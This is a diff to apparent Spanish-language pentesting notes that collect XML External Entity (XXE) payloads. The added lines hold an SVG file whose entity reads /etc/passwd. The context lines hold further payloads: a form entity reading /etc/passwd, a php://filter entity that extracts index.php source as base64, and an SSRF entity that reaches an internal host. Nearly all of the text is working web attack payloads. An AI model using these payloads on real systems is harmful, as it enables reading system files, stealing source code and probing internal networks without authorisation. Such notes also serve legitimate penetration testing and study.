@@ -18,10 +18,19 @@ Si el formulario es vulnerable mostrará el dato de la entidad, de no serlo most
   <!ENTITY company SYSTEM "file:///etc/passwd">
 ]>
 
+leer archivos mediante un svg:
+
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<svg>&xxe;</svg>
+
 ######## Obtener el código de la página php:
 <!DOCTYPE email [
   <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
 ]>
+
+
 
 #########################SSRF
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
